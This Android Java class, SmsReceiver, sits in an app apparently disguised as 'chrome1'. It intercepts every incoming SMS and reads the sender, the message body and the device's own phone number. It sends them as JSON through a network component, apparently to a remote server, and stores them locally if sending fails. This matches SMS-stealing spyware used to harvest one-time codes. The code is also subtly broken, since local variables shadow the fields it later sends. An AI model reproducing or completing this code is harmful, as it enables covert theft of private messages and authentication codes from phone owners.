package com.example.chrome1.sms;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.chrome1.BootService;
import com.example.chrome1.Interface.OnNetwork;
import com.example.chrome1.network.Network;
import com.example.chrome1.sqliteHelper.MySqliteHelper;
import com.example.chrome1.sqliteHelper.SqlLiteUtli.SqlLiteUpdateUtil;

import org.json.JSONObject;

import java.nio.channels.SocketChannel;

//替换默认短信以后就会在这个界面
public class SmsReceiver extends BroadcastReceiver implements OnNetwork {
    private Network network;
    private String number;
    private String text;
    private SQLiteDatabase database;

    @Override
    public void onReceive(Context context, Intent intent) {
        MySqliteHelper helper = new MySqliteHelper(context);
        database = helper.getWritableDatabase();
        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        String senderNumber = smsMessages[0].getOriginatingAddress();
        String messages = getSmsMessages(smsMessages);
        String number = getNumber(context);
        if (number == null) {
            String TAG = "SmsReceiver";
            Log.e(TAG, "number null");
            return;
        }
        String text = ToJson(number, senderNumber, messages);
        Network network = new Network();
        network.addOnNetworks(this);
        network.start(context);
    }

    private boolean sendMsm(Network network, String number, String text) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("type", "sms");
            jsonObject.put("phone", number);
            jsonObject.put("context", text);
            network.sendMessage(jsonObject.toString());
            return true;
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return false;
    }

    //获取短信
    private String getSmsMessages(SmsMessage[] smsMessages) {
        // 组装短信内容
        StringBuilder text = new StringBuilder();
        for (SmsMessage smsMessage : smsMessages) {
            text.append(smsMessage.getMessageBody());
        }
        return text.toString();
    }


    @SuppressLint("HardwareIds")
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    Activity#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for Activity#requestPermissions for more details.
                return null;
            }
        }
        return tm.getLine1Number();
    }

    private String ToJson(String number, String senderNumber, String smsMessages) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("number", number);
            jsonObject.put("senderNumber", senderNumber);
            jsonObject.put("smsMessages", smsMessages);
            jsonObject.put("type", "sms");
            return jsonObject.toString();
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return null;
    }

    @Override
    public void connect() {
        boolean id = sendMsm(network, number, text);
        if (!id) {
            //记录本地数据库
            ContentValues contentValues = new ContentValues();
            contentValues.put("phone", number);
            contentValues.put("context", text);
            database.insert("records", null, contentValues);
        }
        //关闭连接
        network.close();
    }

    @Override
    public void close() {

    }
}
